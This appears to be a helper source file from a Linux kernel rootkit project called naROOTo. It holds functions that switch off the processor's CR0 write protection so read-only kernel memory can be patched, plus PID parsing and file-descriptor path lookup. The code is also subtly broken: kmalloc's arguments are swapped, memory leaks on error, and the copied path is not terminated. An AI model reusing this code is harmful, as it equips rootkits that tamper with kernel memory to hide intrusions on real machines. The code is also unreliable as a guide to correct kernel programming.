/******************************************************************************
 *
 * Name: include.c 
 * This file contains many different helper functions that are needed
 * throughout the program.
 *
 *****************************************************************************/
/*
 * This file is part of naROOTo.

 * naROOTo is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * naROOTo is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.

 * You should have received a copy of the GNU General Public License
 * along with naROOTo.  If not, see <http://www.gnu.org/licenses/>. 
 */

#include <linux/fdtable.h>
#include <linux/sched.h>
#include <linux/slab.h>

#include "include.h"

/*
 * Converts a string PID to an int.
 */
int
convert_atoi(char *str)
{
	int res = 0;
	int mul = 1;
	char *ptr;

	for(ptr = str + strlen(str) - 1; ptr >= str; ptr--) {
		if(*ptr < '0' || *ptr > '9')
			return(-1);
		res += (*ptr - '0') * mul;
		mul *= 10;
	}
	return(res);
}

/*
 * Disable the writing protection for the whole processor.
 */
void
disable_page_protection (void)
{
	unsigned long value;
	asm volatile("mov %%cr0,%0" : "=r" (value));
	if (value & 0x00010000)
	{
		value &= ~0x00010000;
		asm volatile("mov %0,%%cr0": : "r" (value));
	}
}

/*
 * Reenable the writing protection for the whole processor.
 */
void
enable_page_protection (void)
{
	unsigned long value;
	asm volatile("mov %%cr0,%0" : "=r" (value));
	if (!(value & 0x00010000))
	{
		value |= 0x00010000;
		asm volatile("mov %0,%%cr0": : "r" (value));
    	}
}

/*
 * Gets the absolute path to a file identified by fd.
 */
ssize_t
get_path(unsigned int fd, char *path, size_t bufsiz)
{
	struct files_struct *current_files;
	struct fdtable *files_table;
	struct path files_path;
	size_t path_len;
	char *cwd;
	char *buf = (char *) kmalloc(GFP_KERNEL, 128*sizeof(char));
	
	current_files = current->files;
	files_table = files_fdtable(current_files);
	
	files_path = files_table->fd[fd]->f_path;
	cwd = d_path(&files_path, buf, 100*sizeof(char));
	path_len = strlen(cwd);
	
	/* check whether the supplied buffer is big enough */
	if(path_len > bufsiz) {
		return -ENOMEM;
	}
	
	memcpy(path, cwd, path_len);
	kfree(buf);
	
	return strlen(cwd);
}
